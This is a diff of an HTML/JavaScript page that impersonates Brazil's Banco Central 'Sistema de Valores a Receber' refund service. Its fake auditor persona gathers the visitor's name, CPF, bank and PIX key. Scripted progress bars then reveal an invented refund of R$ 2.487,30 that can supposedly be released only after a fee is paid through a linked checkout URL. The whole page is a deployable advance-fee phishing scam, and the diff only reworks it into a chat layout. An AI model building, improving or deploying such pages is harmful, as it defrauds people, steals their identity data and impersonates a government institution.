@@ -3,278 +3,227 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SVR - Sistema de Valores a Receber</title>
-    <link href="https://fonts.googleapis.com/css2?family=Rawline:wght@400;700&family=Roboto:wght@300;400;700;900&display=swap" rel="stylesheet">
+    <title>SVR - Consulta Interativa</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
     <style>
-        :root { --blue-gov: #003399; --blue-dark: #061d3e; --gray-light: #f8f9fa; --green-gov: #168821; }
-        body { font-family: 'Roboto', sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; color: #333; }
+        :root { --blue-gov: #003399; --bg-chat: #f4f7f9; --white: #ffffff; }
+        body { font-family: 'Roboto', sans-serif; background-color: #e9ecef; margin: 0; padding: 0; }
         
-        /* Header Padrão GOV.BR */
-        .gov-header { background: var(--blue-gov); color: white; padding: 15px 20px; border-bottom: 4px solid #FFCD00; display: flex; align-items: center; }
-        .gov-header img { height: 30px; margin-right: 15px; }
-        .gov-header div { line-height: 1.2; }
-        .gov-header b { font-size: 14px; text-transform: uppercase; display: block; }
-        .gov-header span { font-size: 11px; font-weight: 300; }
+        .header { background: var(--blue-gov); color: white; padding: 15px; border-bottom: 3px solid #d4af37; position: sticky; top: 0; z-index: 100; display: flex; align-items: center; }
+        .header img { height: 25px; margin-right: 12px; }
+        .header b { font-size: 13px; text-transform: uppercase; }
 
-        .main-container { max-width: 500px; margin: 0 auto; background: white; min-height: 100vh; padding-bottom: 50px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
-        
-        /* Banner do Auditor */
-        .auditor-strip { background: var(--gray-light); padding: 15px; border-bottom: 1px solid #ddd; display: flex; align-items: center; }
-        .auditor-strip img { width: 50px; height: 50px; border-radius: 4px; margin-right: 12px; border: 1px solid #ccc; }
-        .auditor-info b { display: block; color: var(--blue-gov); font-size: 14px; }
-        .auditor-info span { font-size: 10px; text-transform: uppercase; font-weight: bold; color: #666; }
+        .chat-container { max-width: 500px; margin: 0 auto; background: var(--bg-chat); min-height: 100vh; padding: 15px; display: flex; flex-direction: column; }
 
-        .content { padding: 20px; }
-        .step { display: none; }
-        .active { display: block; }
+        .msg { max-width: 85%; padding: 15px; border-radius: 12px; margin-bottom: 15px; font-size: 15px; line-height: 1.5; display: none; position: relative; animation: fadeIn 0.3s ease; }
+        .msg-roberto { background: var(--white); color: #333; align-self: flex-start; border-bottom-left-radius: 2px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+        .perfil { display: flex; align-items: center; margin-bottom: 8px; font-weight: bold; color: var(--blue-gov); font-size: 12px; }
+        .perfil img { width: 30px; height: 30px; border-radius: 50%; margin-right: 8px; border: 1px solid var(--blue-gov); }
 
-        /* Estilo Profissional de Formulário */
-        .label { font-size: 12px; font-weight: 700; color: var(--blue-dark); margin-bottom: 8px; display: block; text-transform: uppercase; }
-        .input-field { width: 100%; padding: 14px; border: 1px solid #888; border-radius: 4px; font-size: 16px; margin-bottom: 15px; box-sizing: border-box; }
-        .btn-gov { background: var(--blue-gov); color: white; border: none; padding: 18px; width: 100%; border-radius: 4px; font-weight: 900; cursor: pointer; text-transform: uppercase; font-size: 14px; transition: 0.2s; }
-        .btn-gov:hover { background: var(--blue-dark); }
-        
-        /* Cards de Opção Profissionais */
-        .option-box { border: 1px solid #ccc; padding: 15px; margin-bottom: 10px; border-radius: 4px; cursor: pointer; display: flex; align-items: center; font-weight: 500; font-size: 14px; }
-        .option-box:hover { background: #f1f5ff; border-color: var(--blue-gov); }
-        .option-box.selected { background: #e8efff; border-color: var(--blue-gov); color: var(--blue-gov); font-weight: bold; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* Tabela de Resultados (Recibo) */
-        .receipt-box { border: 1px solid #000; padding: 15px; font-family: 'Courier New', Courier, monospace; background: #fff; margin: 20px 0; }
-        .receipt-line { display: flex; justify-content: space-between; margin-bottom: 5px; border-bottom: 1px dashed #eee; }
-        .receipt-total { border-top: 2px solid #000; margin-top: 10px; padding-top: 10px; font-weight: bold; font-size: 18px; }
+        .input-area { display: none; margin-bottom: 20px; animation: fadeIn 0.5s ease; }
+        .field { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; box-sizing: border-box; margin-bottom: 10px; }
+        .btn { background: var(--blue-gov); color: white; border: none; padding: 18px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 13px; }
 
-        /* Barra de Progresso */
-        .progress-wrap { display: none; text-align: center; margin: 30px 0; }
-        .progress-bg { background: #eee; height: 12px; border-radius: 10px; overflow: hidden; border: 1px solid #ccc; }
-        .progress-bar { background: var(--green-gov); height: 100%; width: 0%; transition: width 0.1s linear; }
+        .recibo { display: none; border: 1px solid #333; padding: 15px; background: #fff; font-family: monospace; font-size: 12px; margin-bottom: 15px; }
+        .recibo-row { display: flex; justify-content: space-between; border-bottom: 1px dashed #ddd; padding: 4px 0; }
 
-        /* Erro Final */
-        .alert-error { display: none; background: #fff5f5; border: 1px solid #c53030; color: #c53030; padding: 15px; border-radius: 4px; margin-top: 20px; }
-        .pay-card { background: #f0fff4; border: 1px solid var(--green-gov); padding: 15px; margin-top: 15px; text-align: center; }
+        .progress-box { display: none; text-align: center; margin: 20px 0; }
+        .progress-bar { background: #eee; height: 10px; border-radius: 5px; overflow: hidden; margin-top: 10px; }
+        .progress-fill { background: #22c55e; height: 100%; width: 0%; transition: width 0.1s linear; }
+
+        .error-final { display: none; border: 1px solid #c53030; background: #fff5f5; padding: 15px; border-radius: 8px; color: #c53030; }
     </style>
 </head>
 <body>
 
-<div class="gov-header">
+<div class="header">
     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_of_Brazil_logo.svg/1200px-Government_of_Brazil_logo.svg.png">
-    <div><b>Banco Central do Brasil</b><span>SVR - Sistema de Valores a Receber</span></div>
+    <b>Banco Central - Auditoria SVR</b>
 </div>
 
-<div class="auditor-strip">
-    <img src="https://raw.githubusercontent.com/portal-verificador-br/robertomenezes/main/robertoitau.png">
-    <div class="auditor-info">
-        <b>Dr. Roberto Silva</b>
-        <span>Auditor Chefe de Restituições Bancárias</span>
+<div class="chat-container">
+    <div id="m1" class="msg msg-roberto">
+        <div class="perfil"><img src="https://raw.githubusercontent.com/portal-verificador-br/robertomenezes/main/robertoitau.png"> Dr. Roberto Silva</div>
+        Olá, sou o Roberto, auditor financeiro do Banco Central. Você sabia que milhões de brasileiros pagaram tarifas indevidas nos últimos anos sem saber?
     </div>
-</div>
-
-<div class="main-container">
-    <div class="content">
-
-        <div id="step1" class="step active">
-            <p style="font-size: 14px; line-height: 1.5;">Para iniciar a <b>Auditoria de Ativos</b>, valide as informações do titular da conta abaixo:</p>
-            <label class="label">Nome Completo:</label>
-            <input type="text" id="nome" class="input-field" placeholder="Nome do Beneficiário">
-            <label class="label">CPF:</label>
-            <input type="tel" id="cpf" class="input-field" placeholder="000.000.000-00">
-            <label class="label">Telefone de Contato:</label>
-            <input type="tel" id="tel" class="input-field" placeholder="(00) 00000-0000">
-            <button class="btn-gov" onclick="next(2)">Validar e Continuar</button>
-        </div>
-
-        <div id="step2" class="step">
-            <label class="label">Qual é a sua principal instituição bancária?</label>
-            <select id="banco_principal" class="input-field">
-                <option value="itau">Itaú Unibanco</option>
-                <option value="bradesco">Bradesco</option>
-                <option value="caixa">Caixa Econômica</option>
-                <option value="bb">Banco do Brasil</option>
-                <option value="nubank">Nubank</option>
-                <option value="outros">Outros Bancos Digitais</option>
-            </select>
-            <label class="label">Você utiliza o aplicativo bancário ativo neste aparelho?</label>
-            <div class="option-box" onclick="selectOpt(this)">Sim, utilizo diariamente.</div>
-            <div class="option-box" onclick="selectOpt(this)">Não/Utilizo raramente.</div>
-            
-            <label class="label" style="margin-top:15px;">Possui conta ativa há mais de 3 anos?</label>
-            <div class="option-box" onclick="selectOpt(this)">Sim, conta antiga (+3 anos).</div>
-            <div class="option-box" onclick="selectOpt(this)">Não, conta recente.</div>
-            
-            <button class="btn-gov" style="margin-top:10px;" onclick="next(3)">Processar Perfil</button>
-        </div>
-
-        <div id="step3" class="step">
-            <p><b>AUDITORIA DE CRÉDITO:</b></p>
-            <label class="label">Você possui algum contrato de empréstimo ou financiamento vigente ou quitado nos últimos 10 anos?</label>
-            <div class="option-box" onclick="selectOpt(this); document.getElementById('area-financ').style.display='block'">Sim, possuo contratos.</div>
-            <div class="option-box" onclick="selectOpt(this); document.getElementById('area-financ').style.display='none'">Não realizei financiamentos.</div>
-
-            <div id="area-financ" style="display:none; margin-top:15px;">
-                <label class="label">Qual a modalidade do contrato?</label>
-                <select class="input-field">
-                    <option>Empréstimo Pessoal / Consignado</option>
-                    <option>Financiamento de Veículo</option>
-                    <option>Financiamento Imobiliário</option>
-                </select>
-            </div>
-            <button class="btn-gov" style="margin-top:20px;" onclick="next(4)">Analisar Contratos</button>
-        </div>
-
-        <div id="step4" class="step">
-            <label class="label">Você utiliza cartão de crédito com frequência?</label>
-            <div class="option-box" onclick="selectOpt(this)">Sim, utilizo cartão físico/virtual.</div>
-            <div class="option-box" onclick="selectOpt(this)">Não utilizo crédito.</div>
-
-            <label class="label" style="margin-top:15px;">Já pagou tarifas de anuidade ou juros de fatura atrasada?</label>
-            <div class="option-box" onclick="selectOpt(this)">Sim, já paguei encargos.</div>
-            <div class="option-box" onclick="selectOpt(this)">Não/Sempre pago em dia.</div>
-
-            <button class="btn-gov" style="margin-top:20px;" onclick="startConsult()">Iniciar Consulta de Valores</button>
-        </div>
-
-        <div id="loading" class="progress-wrap">
-            <p id="status-txt" style="font-weight:bold; font-size:13px;">CONECTANDO AO BANCO CENTRAL...</p>
-            <div class="progress-bg"><div id="bar" class="progress-bar"></div></div>
-        </div>
-
-        <div id="step5" class="step">
-            <h3 style="color:var(--green-gov); border-bottom: 2px solid var(--green-gov); padding-bottom: 10px;">VALORES IDENTIFICADOS</h3>
-            <div class="receipt-box">
-                <div style="text-align:center; font-weight:bold; margin-bottom:10px;">EXTRATO DE AUDITORIA #2026-SVR</div>
-                <div class="receipt-line"><span>TITULAR:</span> <b id="r-nome"></b></div>
-                <div class="receipt-line"><span>CPF:</span> <b id="r-cpf"></b></div>
-                <div class="receipt-line" style="margin-top:10px;"><span>REEMBOLSO TARIFAS:</span> <span>R$ 1.142,10</span></div>
-                <div class="receipt-line"><span>ESTORNO JUROS SELIC:</span> <span>R$ 845,20</span></div>
-                <div class="receipt-line"><span>TAXAS ADM. CARTÃO:</span> <span>R$ 500,00</span></div>
-                <div class="receipt-total"><span>VALOR DISPONÍVEL:</span> <span>R$ 2.487,30</span></div>
-            </div>
-            <button class="btn-gov" onclick="next(6)">Solicitar Saque do Valor</button>
-        </div>
-
-        <div id="step6" class="step">
-            <label class="label">Como deseja receber sua restituição?</label>
-            <div class="option-box" onclick="selectMethod('pix')">PIX (Transferência Imediata)</div>
-            <div class="option-box" onclick="selectMethod('ted')">TED (Até 24 horas úteis)</div>
-
-            <div id="input-pix" style="display:none; margin-top:20px;">
-                <label class="label">Digite sua Chave PIX:</label>
-                <input type="text" id="chave-val" class="input-field" placeholder="CPF, E-mail, Celular ou Aleatória">
-            </div>
-
-            <div id="input-ted" style="display:none; margin-top:20px;">
-                <label class="label">Agência e Conta:</label>
-                <input type="text" class="input-field" placeholder="0000-0 / 00000-0">
-            </div>
-
-            <button class="btn-gov" id="btn-metodo" style="display:none;" onclick="next(7)">Confirmar Método</button>
-        </div>
-
-        <div id="step7" class="step">
-            <label class="label">TERMO DE RESPONSABILIDADE:</label>
-            <div style="background:#f9f9f9; padding:15px; font-size:12px; border:1px solid #ddd; height: 100px; overflow-y: scroll; margin-bottom:15px;">
-                O saque via sistema SVR é um direito assegurado pela Lei 14.XXX/26. O beneficiário declara ciência de que o sistema permite apenas UM SAQUE POR CPF por lote anual. Qualquer tentativa de fraude resultará em bloqueio do CPF no Registrato.
-            </div>
-            <input type="checkbox" id="check-termo"> <label for="check-termo" style="font-size:12px; font-weight:bold;">ESTOU CIENTE E DESEJO CONTINUAR.</label>
-            
-            <div class="receipt-box" style="margin-top:20px; font-family: sans-serif;">
-                <b>RESUMO DO PEDIDO:</b><br>
-                Nome: <span id="res-nome"></span><br>
-                CPF: <span id="res-cpf"></span><br>
-                Valor: R$ 2.487,30<br>
-                Chave: <span id="res-chave"></span>
-            </div>
-            <button class="btn-gov btn-green" onclick="finalTransfer()">Confirmar Envio e Receber</button>
-        </div>
-
-        <div id="error-box" class="alert-error">
-            <b>GUIA DE TRANSPORTE (GT-SVR) NÃO LOCALIZADA</b><br>
-            O valor de <b>R$ 2.487,30</b> foi processado, mas o envio foi bloqueado pela ausência do pagamento da <b>Tarifa de Emissão de Nota Fiscal Eletrônica</b>.
-            
-            <div class="pay-card">
-                <span style="font-size:13px;">O valor da taxa é reembolsado no saque.</span><br>
-                <b style="font-size:20px; color:var(--green-gov);">VALOR TOTAL: R$ 2.524,30</b>
-                <a href="https://pay.checkoutpixes.com/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" class="btn-gov" style="text-decoration:none; display:block; margin-top:10px; background:var(--green-gov);">PAGAR TARIFA E RECEBER AGORA</a>
-            </div>
-        </div>
-
+    <div id="m2" class="msg msg-roberto">
+        Nosso sistema agora permite que você consulte e resgate esses valores acumulados de forma direta. Deseja iniciar sua consulta oficial?
     </div>
+    <div id="i1" class="input-area" style="display:block;">
+        <button class="btn" onclick="next(1)">SIM, DESEJO CONSULTAR MEUS VALORES</button>
+    </div>
+
+    <div id="m3" class="msg msg-roberto">Perfeito. Para localizarmos seu protocolo, informe seu Nome Completo e CPF:</div>
+    <div id="i2" class="input-area">
+        <input type="text" id="nome" class="field" placeholder="Nome Completo">
+        <input type="tel" id="cpf" class="field" placeholder="CPF">
+        <button class="btn" onclick="next(2)">VALIDAR DADOS</button>
+    </div>
+
+    <div id="m4" class="msg msg-roberto">Dados recebidos. Qual é o banco onde você possui movimentação mais frequente?</div>
+    <div id="i3" class="input-area">
+        <select id="banco" class="field">
+            <option value="Itaú">Itaú Unibanco</option>
+            <option value="Bradesco">Bradesco</option>
+            <option value="Caixa">Caixa Econômica</option>
+            <option value="Santander">Santander</option>
+            <option value="Nubank">Nubank</option>
+        </select>
+        <button class="btn" onclick="next(3)">CONTINUAR</button>
+    </div>
+
+    <div id="m5" class="msg msg-roberto">Você possui conta ativa nesse banco há mais de 3 anos e utiliza o aplicativo no celular?</div>
+    <div id="i4" class="input-area">
+        <button class="btn" style="margin-bottom:8px;" onclick="next(4)">SIM, POSSUO E UTILIZO</button>
+        <button class="btn" style="background:#666;" onclick="next(4)">NÃO/UTILIZO POUCO</button>
+    </div>
+
+    <div id="m6" class="msg msg-roberto">Entendido. Você já realizou algum empréstimo ou financiamento (casa/carro) nos últimos 10 anos?</div>
+    <div id="i5" class="input-area">
+        <button class="btn" style="margin-bottom:8px;" onclick="next(5)">SIM, JÁ REALIZEI</button>
+        <button class="btn" style="background:#666;" onclick="next(5)">NUNCA REALIZEI</button>
+    </div>
+
+    <div id="m7" class="msg msg-roberto">E sobre cartões de crédito: você já pagou faturas com juros ou taxas de anuidade?</div>
+    <div id="i6" class="input-area">
+        <button class="btn" onclick="startSearch()">ANALISAR MEUS ESTORNOS</button>
+    </div>
+
+    <div id="load-search" class="progress-box">
+        <b style="font-size:12px; color:var(--blue-gov);" id="status-search">PESQUISANDO ATIVOS NO REGISTRATO...</b>
+        <div class="progress-bar"><div id="fill-search" class="progress-fill"></div></div>
+    </div>
+
+    <div id="m8" class="msg msg-roberto"><b>VALORES ENCONTRADOS!</b> O sistema localizou créditos acumulados para o seu CPF. Confira o recibo de auditoria:</div>
+    <div id="recibo1" class="recibo">
+        <div style="text-align:center; font-weight:bold; margin-bottom:10px;">EXTRATO OFICIAL SVR</div>
+        <div class="recibo-row"><span>BENEFICIÁRIO:</span> <b id="r-nome"></b></div>
+        <div class="recibo-row"><span>CPF:</span> <b id="r-cpf"></b></div>
+        <div class="recibo-row"><span>INSTITUIÇÃO:</span> <b id="r-banco"></b></div>
+        <div class="recibo-row" style="margin-top:8px;"><span>TARIFAS ADM:</span> <span>R$ 1.987,30</span></div>
+        <div class="recibo-row"><span>JUROS SELIC:</span> <span>R$ 500,00</span></div>
+        <div class="recibo-row" style="font-weight:bold; font-size:14px; margin-top:10px; border-top: 1px solid #000;">
+            <span>TOTAL A RECEBER:</span> <span>R$ 2.487,30</span>
+        </div>
+    </div>
+    <div id="i7" class="input-area">
+        <button class="btn" style="background:#22c55e;" onclick="next(7)">SOLICITAR RESGATE AGORA</button>
+    </div>
+
+    <div id="m9" class="msg msg-roberto">Como deseja receber o valor? (Lembrando que o PIX é imediato).</div>
+    <div id="i8" class="input-area">
+        <button class="btn" style="margin-bottom:8px;" onclick="setMethod('PIX')">TRANSFERÊNCIA VIA PIX</button>
+        <button class="btn" style="background:#666;" onclick="setMethod('TED')">TRANSFERÊNCIA VIA TED</button>
+    </div>
+
+    <div id="i9" class="input-area">
+        <label style="font-size:12px; font-weight:bold;">INFORME SUA CHAVE PIX:</label>
+        <input type="text" id="chave" class="field" placeholder="CPF, Celular ou E-mail">
+        <button class="btn" onclick="next(9)">CONFIRMAR CHAVE</button>
+    </div>
+
+    <div id="m10" class="msg msg-roberto"><b>TERMO DE SEGURANÇA:</b> Este é um saque único por CPF. Ao confirmar, o valor será enviado para a chave informada. Deseja finalizar?</div>
+    <div id="i10" class="input-area">
+        <button class="btn" onclick="finalTransfer()">SIM, ENVIAR MEU DINHEIRO</button>
+    </div>
+
+    <div id="load-final" class="progress-box">
+        <b style="font-size:12px; color:var(--blue-gov);" id="status-final">INICIANDO TRANSFERÊNCIA...</b>
+        <div class="progress-bar"><div id="fill-final" class="progress-fill"></div></div>
+    </div>
+
+    <div id="error-box" class="error-final">
+        <b style="font-size:15px;">ERRO DE LIQUIDAÇÃO: GT-SVR AUSENTE</b><br><br>
+        O lote de <b>R$ 2.487,30</b> foi processado, mas o envio foi bloqueado devido à ausência da <b>Tarifa de Emissão de Documento Federal (R$ 37,00)</b>.
+        <br><br>
+        <b>RECIBO DE REEMBOLSO ATUALIZADO:</b>
+        <div class="recibo" style="display:block; margin-top:10px; border-color:#c53030;">
+            <div class="recibo-row"><span>VALOR ORIGINAL:</span> <span>R$ 2.487,30</span></div>
+            <div class="recibo-row"><span>ESTORNO TARIFA:</span> <span>R$ 37,00</span></div>
+            <div class="recibo-row" style="font-weight:bold; color:#168821; font-size:15px;">
+                <span>TOTAL A RECEBER:</span> <span>R$ 2.524,30</span>
+            </div>
+        </div>
+        <a href="https://pay.checkoutpixes.com/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" class="btn" style="text-decoration:none; display:block; text-align:center; background:#c53030;">PAGAR TAXA E RECEBER R$ 2.524,30 AGORA</a>
+    </div>
+
 </div>
 
 <script>
-    let data = {};
+    let uNome = "";
+    let uBanco = "";
 
     function next(n) {
-        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        document.getElementById('step' + n).classList.add('active');
-        window.scrollTo(0,0);
-
-        if(n == 2) {
-            data.nome = document.getElementById('nome').value;
-            data.cpf = document.getElementById('cpf').value;
-            data.tel = document.getElementById('tel').value;
+        if(n==1) { show('m3'); show('i2'); hide('i1'); }
+        if(n==2) {
+            uNome = document.getElementById('nome').value;
+            if(uNome.length < 3) return alert("Preencha seu nome.");
+            hide('i2'); show('m4'); show('i3');
         }
+        if(n==3) {
+            uBanco = document.getElementById('banco').value;
+            hide('i3'); show('m5'); show('i4');
+        }
+        if(n==4) { hide('i4'); show('m6'); show('i5'); }
+        if(n==5) { hide('i5'); show('m7'); show('i6'); }
+        if(n==7) { hide('i7'); show('m9'); show('i8'); }
+        if(n==9) { hide('i9'); show('m10'); show('i10'); }
+        window.scrollTo({top: document.body.scrollHeight, behavior: 'smooth'});
     }
 
-    function selectOpt(el) {
-        el.parentElement.querySelectorAll('.option-box').forEach(o => o.classList.remove('selected'));
-        el.classList.add('selected');
-    }
+    function show(id) { document.getElementById(id).style.display = 'block'; }
+    function hide(id) { document.getElementById(id).style.display = 'none'; }
 
-    function startConsult() {
-        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        document.getElementById('loading').style.display = 'block';
-        let bar = document.getElementById('bar');
-        let txt = document.getElementById('status-txt');
+    function startSearch() {
+        hide('i6'); show('load-search');
+        let bar = document.getElementById('fill-search');
+        let txt = document.getElementById('status-search');
         let w = 0;
         let int = setInterval(() => {
-            w += 0.3;
-            bar.style.width = w + '%';
-            if(w > 30) txt.innerText = "PESQUISANDO REGISTRATO (BACEN)...";
-            if(w > 60) txt.innerText = "CALCULANDO ESTORNOS DE TARIFAS ADM...";
-            if(w > 90) txt.innerText = "CONSOLIDANDO RECIBO DE LIQUIDAÇÃO...";
+            w += 0.5;
+            bar.style.width = w + "%";
+            if(w > 30) txt.innerText = "LOCALIZANDO CONTAS EM " + uBanco.toUpperCase() + "...";
+            if(w > 70) txt.innerText = "CALCULANDO TARIFAS ACUMULADAS...";
             if(w >= 100) {
                 clearInterval(int);
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('r-nome').innerText = data.nome.toUpperCase();
-                document.getElementById('r-cpf').innerText = data.cpf;
-                next(5);
+                hide('load-search');
+                document.getElementById('r-nome').innerText = uNome.toUpperCase();
+                document.getElementById('r-cpf').innerText = document.getElementById('cpf').value;
+                document.getElementById('r-banco').innerText = uBanco;
+                show('m8'); show('recibo1'); show('i7');
+                window.scrollTo({top: document.body.scrollHeight, behavior: 'smooth'});
             }
         }, 40);
     }
 
-    function selectMethod(m) {
-        document.getElementById('input-pix').style.display = m == 'pix' ? 'block' : 'none';
-        document.getElementById('input-ted').style.display = m == 'ted' ? 'block' : 'none';
-        document.getElementById('btn-metodo').style.display = 'block';
-        data.metodo = m.toUpperCase();
+    function setMethod(m) {
+        hide('i8');
+        if(m == 'PIX') { show('i9'); } else { alert("TED indisponível no momento. Use PIX."); show('i8'); }
     }
 
     function finalTransfer() {
-        if(!document.getElementById('check-termo').checked) return alert("Aceite os termos.");
-        data.chave = document.getElementById('chave-val').value || "TED BANCÁRIO";
-        
-        document.getElementById('res-nome').innerText = data.nome.toUpperCase();
-        document.getElementById('res-cpf').innerText = data.cpf;
-        document.getElementById('res-chave').innerText = data.chave;
-
-        document.getElementById('step7').classList.remove('active');
-        document.getElementById('loading').style.display = 'block';
-        document.getElementById('status-txt').innerText = "AUTORIZANDO ENVIO DO LOTE...";
-        
-        let bar = document.getElementById('bar');
-        bar.style.width = '0%';
+        hide('i10'); show('load-final');
+        let bar = document.getElementById('fill-final');
         let w = 0;
         let int = setInterval(() => {
             w += 0.8;
-            bar.style.width = w + '%';
+            bar.style.width = w + "%";
             if(w >= 100) {
                 clearInterval(int);
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('error-box').style.display = 'block';
+                hide('load-final');
+                show('error-box');
+                window.scrollTo({top: document.body.scrollHeight, behavior: 'smooth'});
             }
         }, 50);
     }
+
+    window.onload = () => {
+        setTimeout(() => show('m1'), 500);
+        setTimeout(() => show('m2'), 1500);
+    }
 </script>
+
 </body>
 </html>
